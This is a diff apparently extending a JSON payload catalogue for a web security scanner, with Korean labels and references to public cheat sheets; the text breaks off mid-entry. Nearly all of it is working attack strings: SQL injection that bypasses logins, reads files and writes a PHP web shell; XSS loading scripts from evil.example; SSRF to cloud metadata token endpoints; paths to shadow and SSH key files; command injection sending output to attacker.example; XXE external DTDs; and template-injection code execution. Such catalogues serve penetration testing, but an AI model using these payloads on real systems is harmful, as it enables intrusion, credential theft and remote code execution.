@@ -351,6 +351,206 @@
           "description": "숫자 비교 우회",
           "risk": "medium",
           "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection"
+        },
+        {
+          "id": "sqli_48",
+          "name": "인증우회 ' or 1=1 limit 1 --",
+          "payload": "' or 1=1 limit 1 -- ",
+          "description": "단일행 반환",
+          "risk": "high",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection"
+        },
+        {
+          "id": "sqli_49",
+          "name": "인증우회 ') or ('1'='1",
+          "payload": "') or ('1'='1",
+          "description": "괄호 컨텍스트",
+          "risk": "high",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection"
+        },
+        {
+          "id": "sqli_50",
+          "name": "인증우회 \" or \"\"=\"",
+          "payload": "\" or \"\"=\"",
+          "description": "쌍따옴표 컨텍스트",
+          "risk": "high",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection"
+        },
+        {
+          "id": "sqli_51",
+          "name": "MySQL 버전",
+          "payload": "' UNION SELECT @@version,NULL-- -",
+          "description": "버전 추출",
+          "risk": "high",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection/MySQL%20Injection.md"
+        },
+        {
+          "id": "sqli_52",
+          "name": "MySQL 현재유저",
+          "payload": "' UNION SELECT current_user(),NULL-- -",
+          "description": "유저 추출",
+          "risk": "high",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection/MySQL%20Injection.md"
+        },
+        {
+          "id": "sqli_53",
+          "name": "MySQL 테이블목록",
+          "payload": "' UNION SELECT table_name,NULL FROM information_schema.tables-- -",
+          "description": "테이블 열거",
+          "risk": "high",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection/MySQL%20Injection.md"
+        },
+        {
+          "id": "sqli_54",
+          "name": "MySQL 컬럼목록",
+          "payload": "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -",
+          "description": "컬럼 열거",
+          "risk": "high",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection/MySQL%20Injection.md"
+        },
+        {
+          "id": "sqli_55",
+          "name": "MySQL 파일읽기",
+          "payload": "' UNION SELECT LOAD_FILE('/etc/passwd'),NULL-- -",
+          "description": "파일 읽기",
+          "risk": "high",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection/MySQL%20Injection.md"
+        },
+        {
+          "id": "sqli_56",
+          "name": "MySQL 웹셸쓰기",
+          "payload": "' UNION SELECT '<?php system($_GET[c]);?>',NULL INTO OUTFILE '/var/www/html/s.php'-- -",
+          "description": "웹셸 작성",
+          "risk": "critical",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection/MySQL%20Injection.md"
+        },
+        {
+          "id": "sqli_57",
+          "name": "MSSQL DB목록",
+          "payload": "' UNION SELECT name,NULL FROM master..sysdatabases-- -",
+          "description": "DB 열거",
+          "risk": "high",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection/MSSQL%20Injection.md"
+        },
+        {
+          "id": "sqli_58",
+          "name": "MSSQL 스택 활성화 xp",
+          "payload": "'; EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE-- -",
+          "description": "xp_cmdshell 활성화",
+          "risk": "critical",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection/MSSQL%20Injection.md"
+        },
+        {
+          "id": "sqli_59",
+          "name": "PostgreSQL 버전",
+          "payload": "' UNION SELECT version(),NULL-- -",
+          "description": "버전 추출",
+          "risk": "high",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection/PostgreSQL%20Injection.md"
+        },
+        {
+          "id": "sqli_60",
+          "name": "PostgreSQL 파일읽기",
+          "payload": "' UNION SELECT pg_read_file('/etc/passwd'),NULL-- -",
+          "description": "파일 읽기",
+          "risk": "high",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection/PostgreSQL%20Injection.md"
+        },
+        {
+          "id": "sqli_61",
+          "name": "Oracle 버전",
+          "payload": "' UNION SELECT banner,NULL FROM v$version-- -",
+          "description": "버전 추출",
+          "risk": "high",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection/OracleSQL%20Injection.md"
+        },
+        {
+          "id": "sqli_62",
+          "name": "Oracle 더미",
+          "payload": "' UNION SELECT NULL FROM dual-- -",
+          "description": "dual 테이블",
+          "risk": "medium",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection/OracleSQL%20Injection.md"
+        },
+        {
+          "id": "sqli_63",
+          "name": "SQLite 버전",
+          "payload": "' UNION SELECT sqlite_version(),NULL-- -",
+          "description": "버전 추출",
+          "risk": "medium",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection/SQLite%20Injection.md"
+        },
+        {
+          "id": "sqli_64",
+          "name": "SQLite 테이블",
+          "payload": "' UNION SELECT name,NULL FROM sqlite_master WHERE type='table'-- -",
+          "description": "테이블 열거",
+          "risk": "medium",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection/SQLite%20Injection.md"
+        },
+        {
+          "id": "sqli_65",
+          "name": "Blind boolean substr",
+          "payload": "' AND substring(version(),1,1)='5'-- -",
+          "description": "버전 문자 이진탐색",
+          "risk": "high",
+          "reference": "https://portswigger.net/web-security/sql-injection/blind"
+        },
+        {
+          "id": "sqli_66",
+          "name": "Blind boolean ascii",
+          "payload": "' AND ascii(substring((SELECT database()),1,1))>100-- -",
+          "description": "ASCII 이진탐색",
+          "risk": "high",
+          "reference": "https://portswigger.net/web-security/sql-injection/blind"
+        },
+        {
+          "id": "sqli_67",
+          "name": "Blind time IF",
+          "payload": "' AND IF(1=1,SLEEP(5),0)-- -",
+          "description": "조건부 지연",
+          "risk": "high",
+          "reference": "https://portswigger.net/web-security/sql-injection/blind"
+        },
+        {
+          "id": "sqli_68",
+          "name": "Blind time benchmark",
+          "payload": "' AND BENCHMARK(5000000,MD5(1))-- -",
+          "description": "CPU 부하 지연",
+          "risk": "medium",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection/MySQL%20Injection.md"
+        },
+        {
+          "id": "sqli_69",
+          "name": "WAF 우회 hex",
+          "payload": "' OR 0x61646d696e=0x61646d696e-- -",
+          "description": "16진 리터럴",
+          "risk": "medium",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/sql-injection"
+        },
+        {
+          "id": "sqli_70",
+          "name": "WAF 우회 scientific",
+          "payload": "' OR 1e0=1-- -",
+          "description": "과학적 표기",
+          "risk": "medium",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/sql-injection"
+        },
+        {
+          "id": "sqli_71",
+          "name": "WAF 우회 no-space paren",
+          "payload": "'OR(1)=(1)-- -",
+          "description": "괄호로 공백 제거",
+          "risk": "medium",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/sql-injection"
+        },
+        {
+          "id": "sqli_72",
+          "name": "WAF 우회 tab/newline",
+          "payload": "'%09OR%09'1'='1",
+          "description": "탭/개행 공백 대체",
+          "risk": "medium",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/sql-injection"
         }
       ],
       "group": "server"
@@ -674,6 +874,182 @@
           "description": "다중 컨텍스트 polyglot",
           "risk": "high",
           "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection"
+        },
+        {
+          "id": "xss_43",
+          "name": "script src 외부",
+          "payload": "<script src=//evil.example/x.js></script>",
+          "description": "외부 스크립트 로드",
+          "risk": "high",
+          "reference": "https://portswigger.net/web-security/cross-site-scripting/cheat-sheet"
+        },
+        {
+          "id": "xss_44",
+          "name": "video onerror",
+          "payload": "<video src=x onerror=alert(1)>",
+          "description": "video 이벤트",
+          "risk": "high",
+          "reference": "https://portswigger.net/web-security/cross-site-scripting/cheat-sheet"
+        },
+        {
+          "id": "xss_45",
+          "name": "audio onerror",
+          "payload": "<audio src=x onerror=alert(1)>",
+          "description": "audio 이벤트",
+          "risk": "high",
+          "reference": "https://portswigger.net/web-security/cross-site-scripting/cheat-sheet"
+        },
+        {
+          "id": "xss_46",
+          "name": "object data",
+          "payload": "<object data=javascript:alert(1)>",
+          "description": "object 프로토콜",
+          "risk": "medium",
+          "reference": "https://portswigger.net/web-security/cross-site-scripting/cheat-sheet"
+        },
+        {
+          "id": "xss_47",
+          "name": "embed src",
+          "payload": "<embed src=javascript:alert(1)>",
+          "description": "embed 프로토콜",
+          "risk": "medium",
+          "reference": "https://portswigger.net/web-security/cross-site-scripting/cheat-sheet"
+        },
+        {
+          "id": "xss_48",
+          "name": "select onfocus",
+          "payload": "<select autofocus onfocus=alert(1)><option>",
+          "description": "자동 포커스",
+          "risk": "high",
+          "reference": "https://portswigger.net/web-security/cross-site-scripting/cheat-sheet"
+        },
+        {
+          "id": "xss_49",
+          "name": "textarea onfocus",
+          "payload": "<textarea autofocus onfocus=alert(1)>",
+          "description": "자동 포커스",
+          "risk": "high",
+          "reference": "https://portswigger.net/web-security/cross-site-scripting/cheat-sheet"
+        },
+        {
+          "id": "xss_50",
+          "name": "keygen onfocus",
+          "payload": "<keygen autofocus onfocus=alert(1)>",
+          "description": "레거시 자동포커스",
+          "risk": "medium",
+          "reference": "https://portswigger.net/web-security/cross-site-scripting/cheat-sheet"
+        },
+        {
+          "id": "xss_51",
+          "name": "style expression",
+          "payload": "<div style=\"width:expression(alert(1))\">",
+          "description": "구형 IE expression",
+          "risk": "low",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting"
+        },
+        {
+          "id": "xss_52",
+          "name": "svg animate",
+          "payload": "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
+          "description": "SVG 애니메이션",
+          "risk": "high",
+          "reference": "https://portswigger.net/web-security/cross-site-scripting/cheat-sheet"
+        },
+        {
+          "id": "xss_53",
+          "name": "svg set",
+          "payload": "<svg><set attributeName=onmouseover to=alert(1)>",
+          "description": "SVG set",
+          "risk": "medium",
+          "reference": "https://portswigger.net/web-security/cross-site-scripting/cheat-sheet"
+        },
+        {
+          "id": "xss_54",
+          "name": "meta refresh",
+          "payload": "<meta http-equiv=refresh content=\"0;url=javascript:alert(1)\">",
+          "description": "meta 리다이렉트",
+          "risk": "medium",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting"
+        },
+        {
+          "id": "xss_55",
+          "name": "base href 하이재킹",
+          "payload": "<base href=//evil.example/>",
+          "description": "상대경로 스크립트 탈취",
+          "risk": "medium",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting"
+        },
+        {
+          "id": "xss_56",
+          "name": "DOM document.write",
+          "payload": "#<script>document.write(1)</script>",
+          "description": "write sink",
+          "risk": "high",
+          "reference": "https://portswigger.net/web-security/cross-site-scripting/dom-based"
+        },
+        {
+          "id": "xss_57",
+          "name": "DOM innerHTML",
+          "payload": "<img src=x onerror=this.parentNode.innerHTML=1>",
+          "description": "innerHTML sink",
+          "risk": "medium",
+          "reference": "https://portswigger.net/web-security/cross-site-scripting/dom-based"
+        },
+        {
+          "id": "xss_58",
+          "name": "이벤트 대문자 우회",
+          "payload": "<img src=x OnErRoR=alert(1)>",
+          "description": "이벤트명 대소문자",
+          "risk": "high",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting"
+        },
+        {
+          "id": "xss_59",
+          "name": "널바이트 태그",
+          "payload": "<scri\\x00pt>alert(1)</scri\\x00pt>",
+          "description": "널바이트 필터우회",
+          "risk": "medium",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting"
+        },
+        {
+          "id": "xss_60",
+          "name": "주석 분할",
+          "payload": "<img src=x o<!-- -->nerror=alert(1)>",
+          "description": "주석으로 키워드 분할",
+          "risk": "medium",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting"
+        },
+        {
+          "id": "xss_61",
+          "name": "유니코드 이스케이프",
+          "payload": "<script>\\u0061lert(1)</script>",
+          "description": "JS 유니코드 이스케이프",
+          "risk": "medium",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting"
+        },
+        {
+          "id": "xss_62",
+          "name": "String.fromCharCode",
+          "payload": "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
+          "description": "문자코드 우회",
+          "risk": "medium",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting"
+        },
+        {
+          "id": "xss_63",
+          "name": "onload iframe",
+          "payload": "<iframe onload=alert(1)>",
+          "description": "iframe onload",
+          "risk": "high",
+          "reference": "https://portswigger.net/web-security/cross-site-scripting/cheat-sheet"
+        },
+        {
+          "id": "xss_64",
+          "name": "template 리터럴",
+          "payload": "<img src=x onerror=alert`1`>",
+          "description": "백틱 호출",
+          "risk": "high",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting"
         }
       ],
       "group": "client"
@@ -879,6 +1255,94 @@
           "description": "gopher로 Redis 등 공격",
           "risk": "critical",
           "reference": "https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery"
+        },
+        {
+          "id": "ssrf_28",
+          "name": "AWS user-data",
+          "payload": "http://169.254.169.254/latest/user-data",
+          "description": "부팅 스크립트 노출",
+          "risk": "high",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery"
+        },
+        {
+          "id": "ssrf_29",
+          "name": "AWS hostname",
+          "payload": "http://169.254.169.254/latest/meta-data/hostname",
+          "description": "호스트명",
+          "risk": "low",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery"
+        },
+        {
+          "id": "ssrf_30",
+          "name": "GCP 토큰",
+          "payload": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
+          "description": "서비스계정 토큰(헤더필요)",
+          "risk": "critical",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf"
+        },
+        {
+          "id": "ssrf_31",
+          "name": "GCP SSH키",
+          "payload": "http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys",
+          "description": "프로젝트 SSH키",
+          "risk": "high",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf"
+        },
+        {
+          "id": "ssrf_32",
+          "name": "DigitalOcean",
+          "payload": "http://169.254.169.254/metadata/v1.json",
+          "description": "DO 메타데이터",
+          "risk": "high",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf"
+        },
+        {
+          "id": "ssrf_33",
+          "name": "localhost 축약 127.1",
+          "payload": "http://127.1/",
+          "description": "축약 표기",
+          "risk": "medium",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery"
+        },
+        {
+          "id": "ssrf_34",
+          "name": "localhost 혼합",
+          "payload": "http://0x7f.1/",
+          "description": "혼합 표기",
+          "risk": "medium",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery"
+        },
+        {
+          "id": "ssrf_35",
+          "name": "IPv6 매핑",
+          "payload": "http://[::ffff:127.0.0.1]/",
+          "description": "IPv4-mapped IPv6",
+          "risk": "medium",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery"
+        },
+        {
+          "id": "ssrf_36",
+          "name": "nip.io",
+          "payload": "http://127.0.0.1.nip.io/",
+          "description": "와일드카드 DNS",
+          "risk": "medium",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery"
+        },
+        {
+          "id": "ssrf_37",
+          "name": "Redis gopher",
+          "payload": "gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A",
+          "description": "Redis 명령 주입",
+          "risk": "critical",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery"
+        },
+        {
+          "id": "ssrf_38",
+          "name": "내부 포트스캔",
+          "payload": "http://127.0.0.1:22/",
+          "description": "내부 서비스 탐지",
+          "risk": "medium",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery"
         }
       ],
       "group": "server"
@@ -1110,6 +1574,134 @@
           "description": "zip 래퍼 포함",
           "risk": "high",
           "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion"
+        },
+        {
+          "id": "lfi_31",
+          "name": "passwd shadow",
+          "payload": "/etc/shadow",
+          "description": "섀도우 파일(권한필요)",
+          "risk": "high",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion"
+        },
+        {
+          "id": "lfi_32",
+          "name": "hosts",
+          "payload": "/etc/hosts",
+          "description": "호스트 파일",
+          "risk": "low",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion"
+        },
+        {
+          "id": "lfi_33",
+          "name": "ssh key",
+          "payload": "/home/user/.ssh/id_rsa",
+          "description": "SSH 개인키",
+          "risk": "high",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion"
+        },
+        {
+          "id": "lfi_34",
+          "name": "apache conf",
+          "payload": "/etc/apache2/apache2.conf",
+          "description": "웹서버 설정",
+          "risk": "medium",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion"
+        },
+        {
+          "id": "lfi_35",
+          "name": "nginx conf",
+          "payload": "/etc/nginx/nginx.conf",
+          "description": "웹서버 설정",
+          "risk": "medium",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion"
+        },
+        {
+          "id": "lfi_36",
+          "name": "windows win.ini",
+          "payload": "C:\\Windows\\win.ini",
+          "description": "윈도우 표준 파일",
+          "risk": "medium",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion"
+        },
+        {
+          "id": "lfi_37",
+          "name": "windows SAM",
+          "payload": "C:\\Windows\\System32\\config\\SAM",
+          "description": "계정 해시(권한필요)",
+          "risk": "high",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion"
+        },
+        {
+          "id": "lfi_38",
+          "name": "traversal 백슬래시",
+          "payload": "..\\..\\..\\..\\..\\..\\windows\\win.ini",
+          "description": "윈도우 역슬래시",
+          "risk": "high",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion"
+        },
+        {
+          "id": "lfi_39",
+          "name": "인코딩 %2e%2e",
+          "payload": "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+          "description": "점/슬래시 인코딩",
+          "risk": "high",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/file-inclusion"
+        },
+        {
+          "id": "lfi_40",
+          "name": "인코딩 이중",
+          "payload": "%252e%252e%252fetc%252fpasswd",
+          "description": "이중 인코딩",
+          "risk": "high",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/file-inclusion"
+        },
+        {
+          "id": "lfi_41",
+          "name": "UTF-8 오버롱",
+          "payload": "..%c0%ae%c0%ae/etc/passwd",
+          "description": "오버롱 점",
+          "risk": "medium",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/file-inclusion"
+        },
+        {
+          "id": "lfi_42",
+          "name": "경로 앞 슬래시 우회",
+          "payload": "....//....//etc/passwd",
+          "description": "중복 점슬래시 필터우회",
+          "risk": "medium",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/file-inclusion"
+        },
+        {
+          "id": "lfi_43",
+          "name": "php filter rot13",
+          "payload": "php://filter/read=string.rot13/resource=index.php",
+          "description": "rot13 필터",
+          "risk": "medium",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion"
+        },
+        {
+          "id": "lfi_44",
+          "name": "php filter 체인",
+          "payload": "php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode/resource=index.php",
+          "description": "필터 체인",
+          "risk": "high",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion"
+        },
+        {
+          "id": "lfi_45",
+          "name": "proc version",
+          "payload": "/proc/version",
+          "description": "커널 버전",
+          "risk": "low",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/file-inclusion"
+        },
+        {
+          "id": "lfi_46",
+          "name": "proc net tcp",
+          "payload": "/proc/net/tcp",
+          "description": "네트워크 연결",
+          "risk": "low",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/file-inclusion"
         }
       ],
       "group": "server"
@@ -1310,6 +1902,94 @@
           "description": "주석으로 뒤 무력화",
           "risk": "high",
           "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection"
+        },
+        {
+          "id": "cmdi_27",
+          "name": "리눅스 ; ls",
+          "payload": "; ls -la",
+          "description": "디렉토리 나열",
+          "risk": "high",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection"
+        },
+        {
+          "id": "cmdi_28",
+          "name": "리눅스 개행+id",
+          "payload": "%0aid%0a",
+          "description": "개행 삽입",
+          "risk": "high",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection"
+        },
+        {
+          "id": "cmdi_29",
+          "name": "리눅스 %0d%0a",
+          "payload": "%0d%0awhoami",
+          "description": "CRLF 명령",
+          "risk": "high",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection"
+        },
+        {
+          "id": "cmdi_30",
+          "name": "리눅스 hex 우회",
+          "payload": "$(printf '\\x69\\x64')",
+          "description": "printf hex",
+          "risk": "medium",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/command-injection"
+        },
+        {
+          "id": "cmdi_31",
+          "name": "리눅스 base64",
+          "payload": "echo aWQ=|base64 -d|sh",
+          "description": "base64 디코드 실행",
+          "risk": "high",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/command-injection"
+        },
+        {
+          "id": "cmdi_32",
+          "name": "리눅스 wildcard",
+          "payload": "/???/??t /???/p??s??",
+          "description": "와일드카드 경로",
+          "risk": "medium",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/command-injection"
+        },
+        {
+          "id": "cmdi_33",
+          "name": "윈도우 %0a",
+          "payload": "%0awhoami",
+          "description": "개행",
+          "risk": "high",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection"
+        },
+        {
+          "id": "cmdi_34",
+          "name": "윈도우 caret 우회",
+          "payload": "who^ami",
+          "description": "caret 필터우회",
+          "risk": "medium",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/command-injection"
+        },
+        {
+          "id": "cmdi_35",
+          "name": "윈도우 powershell",
+          "payload": "& powershell -c \"whoami\"",
+          "description": "PS 실행",
+          "risk": "high",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection"
+        },
+        {
+          "id": "cmdi_36",
+          "name": "blind curl OOB",
+          "payload": "; curl http://attacker.example/$(whoami)",
+          "description": "OOB HTTP 유출",
+          "risk": "high",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection"
+        },
+        {
+          "id": "cmdi_37",
+          "name": "blind wget",
+          "payload": "; wget http://attacker.example/`id`",
+          "description": "OOB wget",
+          "risk": "high",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection"
         }
       ],
       "group": "server"
@@ -1417,6 +2097,46 @@
           "description": "파일 업로드 SVG XXE",
           "risk": "high",
           "reference": "https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity"
+        },
+        {
+          "id": "xxe_14",
+          "name": "param entity 외부DTD",
+          "payload": "<!DOCTYPE r [<!ENTITY % dtd SYSTEM \"http://attacker.example/e.dtd\">%dtd;]><r>&send;</r>",
+          "description": "외부 DTD 로드",
+          "risk": "high",
+          "reference": "https://portswigger.net/web-security/xxe/blind"
+        },
+        {
+          "id": "xxe_15",
+          "name": "UTF-16 우회",
+          "payload": "<?xml version=\"1.0\" encoding=\"UTF-16\"?>...",
+          "description": "인코딩 필터 우회",
+          "risk": "medium",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity"
+        },
+        {
+          "id": "xxe_16",
+          "name": "로컬 DTD 재사용",
+          "payload": "<!DOCTYPE r SYSTEM \"file:///usr/share/xml/...dtd\">...",
+          "description": "로컬 DTD 파라미터 오염",
+          "risk": "high",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity"
+        },
+        {
+          "id": "xxe_17",
+          "name": "SOAP XXE",
+          "payload": "<soap:Body>...<!ENTITY x SYSTEM \"file:///etc/passwd\">...",
+          "description": "SOAP 엔드포인트",
+          "risk": "high",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection"
+        },
+        {
+          "id": "xxe_18",
+          "name": "XInclude",
+          "payload": "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/passwd\"/></foo>",
+          "description": "XInclude(외부 DOCTYPE 불가시)",
+          "risk": "high",
+          "reference": "https://portswigger.net/web-security/xxe"
         }
       ],
       "group": "server"
@@ -1569,6 +2289,78 @@
           "description": "Mako 템플릿 실행",
           "risk": "critical",
           "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection"
+        },
+        {
+          "id": "ssti_20",
+          "name": "Jinja2 self",
+          "payload": "{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}",
+          "description": "self 경유 RCE",
+          "risk": "critical",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection"
+        },
+        {
+          "id": "ssti_21",
+          "name": "Jinja2 request",
+          "payload": "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
+          "description": "request 경유",
+          "risk": "critical",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection"
+        },
+        {
+          "id": "ssti_22",
+          "name": "Jinja2 lipsum",
+          "payload": "{{lipsum.__globals__['os'].popen('id').read()}}",
+          "description": "lipsum 가젯",
+          "risk": "critical",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection"
+        },
+        {
+          "id": "ssti_23",
+          "name": "Jinja2 subclasses",
+          "payload": "{{''.__class__.__mro__[1].__subclasses__()}}",
+          "description": "서브클래스 열거",
+          "risk": "high",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection"
+        },
+        {
+          "id": "ssti_24",
+          "name": "Twig _self",
+          "payload": "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}",
+          "description": "Twig 필터콜백",
+          "risk": "critical",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection"
+        },
+        {
+          "id": "ssti_25",
+          "name": "Handlebars RCE",
+          "payload": "{{#with \"s\" as |string|}}...{{/with}}",
+          "description": "Handlebars 프로토타입 가젯",
+          "risk": "high",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection"
+        },
+        {
+          "id": "ssti_26",
+          "name": "Pug RCE",
+          "payload": "#{root.process.mainModule.require('child_process').execSync('id')}",
+          "description": "Pug/Jade 실행",
+          "risk": "critical",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection"
+        },
+        {
+          "id": "ssti_27",
+          "name": "EJS RCE",
+          "payload": "<%= process.mainModule.require('child_process').execSync('id') %>",
+          "description": "EJS 실행",
+          "risk": "critical",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection"
+        },
+        {
+          "id": "ssti_28",
+          "name": "탐지 곱셈들",
+          "payload": "{{7*7}}|${7*7}|<%=7*7%>|#{7*7}",
+          "description": "다중엔진 탐지 폴리글랏",
+          "risk": "medium",
+          "reference": "https://portswigger.net/web-security/server-side-template-injection"
         }
       ],
       "group": "server"
@@ -1674,6 +2466,54 @@
           "description": "JS 컨텍스트 주석",
           "risk": "medium",
           "reference": "https://book.hacktricks.xyz/pentesting-web/nosql-injection"
+        },
+        {
+          "id": "nosql_14",
+          "name": "$ne 인증우회 JSON",
+          "payload": "{\"user\":{\"$ne\":\"\"},\"pass\":{\"$ne\":\"\"}}",
+          "description": "항상 참",
+          "risk": "critical",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection"
+        },
+        {
+          "id": "nosql_15",
+          "name": "$regex 블라인드",
+          "payload": "{\"user\":\"admin\",\"pass\":{\"$regex\":\"^p\"}}",
+          "description": "비번 이진탐색",
+          "risk": "high",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection"
+        },
+        {
+          "id": "nosql_16",
+          "name": "$where 인젝션",
